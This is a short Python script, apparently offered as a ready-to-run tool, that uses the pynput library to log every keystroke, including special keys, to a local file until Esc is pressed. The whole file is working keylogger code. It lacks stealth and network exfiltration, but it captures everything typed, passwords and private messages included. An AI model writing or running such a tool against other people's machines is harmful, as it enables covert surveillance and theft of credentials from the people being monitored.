from pynput import keyboard

# Specify the file where keystrokes will be saved
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            # Write the key to the log file
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys like 'Ctrl', 'Alt', etc.
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

def on_release(key):
    # Stop the keylogger when 'Esc' key is pressed
    if key == keyboard.Key.esc:
        return False

def main():
    print("Keylogger started... Press 'Esc' to stop.")
    
    # Set up the listener for keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
